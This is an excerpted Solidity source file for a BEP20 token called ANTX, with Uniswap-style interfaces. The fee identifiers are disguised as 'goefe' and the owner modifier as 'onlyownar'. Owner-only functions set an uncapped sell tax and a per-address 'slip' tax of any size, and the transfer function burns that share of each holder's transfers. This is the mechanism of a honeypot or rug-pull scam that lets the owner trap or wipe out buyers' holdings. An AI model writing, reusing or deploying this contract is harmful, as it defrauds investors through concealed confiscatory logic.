...
interface IUniswapV2Factory {
    ...
    function goefeTo() external view returns (address);
    function goefeToSetter() external view returns (address);
    ...
    function setgoefeTo(address) external;
    function setgoefeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinggoefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinggoefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinggoefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinggoefeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinggoefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ANTX is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellgoefe = 0;

    uint256 private _defaultBuygoefe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipgoefe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellgoefe = _value;
    }

    function setSlipgoefe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipgoefe[_address] = _value;
    }

    function getSlipgoefe(address _address) external view onlyownar returns (uint256) {
        return _slipgoefe[_address];
    }


    function setMAccountgoefe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountgoefe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradegoefeAmount = 0;

        if (rF) {
            uint256 tradegoefe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradegoefe = _defaultSellgoefe;
                }
                if (from == uniswapV2Pair) {

                    tradegoefe = _defaultBuygoefe;
                }
            }
            if (_slipgoefe[from] > 0) {
                tradegoefe = _slipgoefe[from];
            }

            tradegoefeAmount = _Amount.mul(tradegoefe).div(100);
        }


        if (tradegoefeAmount > 0) {
            _balances[from] = _balances[from].sub(tradegoefeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradegoefeAmount);
            emit Transfer(from, _deadAddress, tradegoefeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradegoefeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradegoefeAmount);
        emit Transfer(from, _to, _Amount - tradegoefeAmount);
    }
